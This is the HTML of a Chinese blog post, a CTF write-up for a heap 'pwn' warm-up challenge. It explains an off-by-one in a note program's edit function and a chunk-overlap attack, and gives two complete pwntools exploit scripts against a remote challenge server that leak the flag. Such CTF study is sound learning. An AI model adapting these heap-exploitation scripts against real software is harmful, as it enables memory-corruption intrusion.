@@ -1,0 +1,234 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>FCTF热身赛 | ixout's blog</title><meta name="author" content="ixout"><meta name="copyright" content="ixout"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="记录一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FCTF热身赛">
+<meta property="og:url" content="https://ixout.github.io/posts/21638/index.html">
+<meta property="og:site_name" content="ixout&#39;s blog">
+<meta property="og:description" content="记录一下">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.staticaly.com/gh/ixout/picture@main/img/8373377e69c3499d90.jpg">
+<meta property="article:published_time" content="2023-04-18T08:57:52.000Z">
+<meta property="article:modified_time" content="2023-04-18T09:54:04.499Z">
+<meta property="article:author" content="ixout">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.staticaly.com/gh/ixout/picture@main/img/8373377e69c3499d90.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ixout.github.io/posts/21638/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'FCTF热身赛',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-04-18 17:54:04'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/mainColor/heoMainColor.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/poem.css"><link rel="stylesheet" href="/css/footerb.css"><link rel="stylesheet" href="/css/bolang.css"><link rel="stylesheet" href="/css/jzbar.css"><link rel="stylesheet" href="/css/trans.css"><link rel="stylesheet" href="/css/gundongtiao.css"><link rel="stylesheet" href="/css/shubiao.css"><link rel="stylesheet" href="/css/fengche.css"><link rel="stylesheet" href="/css/alitubiao.css"><link rel="stylesheet" href="/css/fps.css"><span id="fps"></span><link rel="stylesheet" href="/css/yituliu.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.css" media="defer" onload="this.media='all'"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-categories-card@1.0.0/lib/categorybar.css"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ixout's blog" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="pokeball-back"></div><div class="pokeball-loading"><div class="pokeball" id="pokeball-normal"></div><div class="pokeball" id="pokeball-great"></div><div class="pokeball" id="pokeball-ultra"></div><div class="pokeball" id="pokeball-master"></div><div class="pokeball" id="pokeball-safari"></div></div></div><script async="async">const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+document.getElementById('loading-box').addEventListener('click',()=> {preloader.endLoading()})
+setTimeout(function(){preloader.endLoading();}, 7000);
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="/css/jzbar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.staticaly.com/gh/ixout/picture@main/img/8373377e69c3499d90.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="ixout's blog"><span class="site-name">ixout's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">FCTF热身赛</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-18T08:57:52.000Z" title="发表于 2023-04-18 16:57:52">2023-04-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-18T09:54:04.499Z" title="更新于 2023-04-18 17:54:04">2023-04-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%A2%98%E8%A7%A3/">题解</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">895</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Pwn-warmup-1"><a href="#Pwn-warmup-1" class="headerlink" title="Pwn warmup 1"></a>Pwn warmup 1</h1><p>保护全开</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/main&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  b&#x27;/glibc/glibc-2.31/build/lib&#x27;</span><br></pre></td></tr></table></figure>
+<p>附件有给源代码,粗读一遍判定为菜单类堆题</p>
+<p>程序开头会直接给出flag的地址</p>
+<p>考虑如何利用,细读源码发现edit函数存在off-by-one漏洞</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">note_t</span> *note = get_note();</span><br><span class="line">  <span class="keyword">if</span> (!note) &#123; <span class="built_in">puts</span>(<span class="string">&quot;Not found&quot;</span>); <span class="keyword">return</span>; &#125;</span><br><span class="line">  <span class="type">int</span> len = <span class="built_in">strlen</span>(note-&gt;content);  </span><br><span class="line">  printff(<span class="string">&quot;New content: &quot;</span>);</span><br><span class="line">  read_str(note-&gt;content, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>strlen函数到\x00结束,如果某个chunk能占用下一个chunk的prev_size则能覆盖下一个chunk的size</p>
+<p>可以用这个漏洞来达到chunk extended and overlapping的目的</p>
+<p>再看add函数,进行add函数时</p>
+<ol>
+<li>首先创建一个chunk用于一个该note信息管理</li>
+<li>再创建一个用户自定义大小的chunk用于存储内容</li>
+</ol>
+<p>这两个chunk是黏在一起的</p>
+<p>于是,我们可以这样利用</p>
+<p>创建3个note</p>
+<ol>
+<li>note0用于触发off-by-one</li>
+<li>note1用于释放重分配以达到chunk extended and overlapping</li>
+<li>note2用于触发show功能读取flag</li>
+</ol>
+<p>具体步骤</p>
+<p>我创建的三个note的content大小都为24且初始填满(1和2填不填无所谓),方便利用</p>
+<ol>
+<li>edit修改note0,使note1的size为一个能够覆盖到note2的content指针的大小</li>
+<li>释放note1</li>
+<li>再add一个note,content大小为能使分配到的chunk为之前释放的note1的content,并填充内容覆盖note2的content指针(这一步)</li>
+<li>对note2进行show,得到flag</li>
+</ol>
+<p><strong>exp:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;1.12.48.154&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr: &#x27;</span>)</span><br><span class="line">a=p.recv()[<span class="number">0</span>:<span class="number">15</span>]</span><br><span class="line">e=<span class="built_in">int</span>(a,<span class="number">16</span>)</span><br><span class="line"><span class="comment">#第0个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;24&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#第1个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;24&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#第2个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;24&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#修改第0个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x61&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#释放第1个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#再分配一个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;80&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span>+p64(e))</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#show</span></span><br><span class="line">p.send(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>以上是我第一次做的思路,这样做的话对note1的content大小没有什么要求</p>
+<p>后面我发现其实只要两个note也能实现得到flag</p>
+<p>不过对note1的content大小有严格要求</p>
+<p>因为如果note1的content实际chunk大小为0x20的话</p>
+<p>再分配note1的时候,note1头的chunk因为大小合适,直接取的之前被释放的note1的content的chunk</p>
+<p>又因为之前的chunk overlapping</p>
+<p>所以note1的content就包含了note1的头,可以直接修改note1的content指针</p>
+<p>再show-note1得到flag</p>
+<p><strong>exp:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;1.12.48.154&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr: &#x27;</span>)</span><br><span class="line">a=p.recv()[<span class="number">0</span>:<span class="number">15</span>]</span><br><span class="line">e=<span class="built_in">int</span>(a,<span class="number">16</span>)</span><br><span class="line"><span class="comment">#第0个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;24&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#第1个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;24&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#修改第0个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x41&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#释放第1个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#再分配一个note</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;48&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>+p64(e))</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#show</span></span><br><span class="line">p.send(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>FCTF热身赛</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://ixout.github.io/posts/21638/">https://ixout.github.io/posts/21638/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>ixout</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2023-04-18</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2023-04-18</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.staticaly.com/gh/ixout/picture@main/img/8373377e69c3499d90.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/23411/" title="IO_FILE"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/ixout/picture@main/img/cfcb137bbbe3415.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">IO_FILE</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-author"><div class="item-headline"><i class="fa-solid fa-circle-user"></i><span>卑微作者</span></div><div class="author-main-content"><div class="author-check-content"><label class="author-info" for="author-info">     <input id="author-info" type="checkbox" name="author-info"/><div class="author-avatar"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-name">ixout</div></label></div><div class="author-switch-content"><input class="switch-content" type="radio" name="switch-content" value="description"/><label class="author-description-box">      <div class="author-description"><font color="#e66b6d">学啥啥不会<br>干啥啥不行</font></div></label><input class="switch-content" type="radio" name="switch-content" value="social" checked="checked"/><label class="author-social-box"><a class="card-author-button" target="_blank" rel="noopener" href="https://github.com/ixout"><i class="iconfont icon-github"></i><span>Follow Me With Github</span></a><div class="social-icons"><a class="social-icon" href="https://github.com/ixout" target="_blank" title="Github"><i class="iconfont icon-github1"></i></a></div></label><input class="switch-content" type="radio" name="switch-content" value="site-data"/><label class="author-data-box"><div class="site-data"><a class="data-item" href="/archives/"><div class="data-name">文章</div><div class="data-length">18</div></a><a class="data-item" href="/tags/"><div class="data-name">标签</div><div class="data-length">20</div></a><a class="data-item" href="/categories/"><div class="data-name">分类</div><div class="data-length">3</div></a></div></label></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>告示牌</span></div><div class="announcement_content"><font color="＃00CED1">(º﹃º)阿巴阿巴阿巴......</font></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn-warmup-1"><span class="toc-number">1.</span> <span class="toc-text">Pwn warmup 1</span></a></li></ol></div></div><div class="card-widget card-recommend-post"><div class="item-headline"><i class="fas fa-dharmachakra"></i><span>相关推荐</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/13868/" title="buuctf刷题记录-1"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/ixout/picture@main/img/efc84907851042d.png" alt="buuctf刷题记录-1"></a><div class="content"><a class="title" href="/posts/13868/" title="buuctf刷题记录-1">buuctf刷题记录-1</a><time datetime="2023-03-21" title="发表于 2023-03-21">2023-03-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/14188/" title="buuctf刷题记录-2"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/ixout/picture@main/img/676eab85f89e48508a.png" alt="buuctf刷题记录-2"></a><div class="content"><a class="title" href="/posts/14188/" 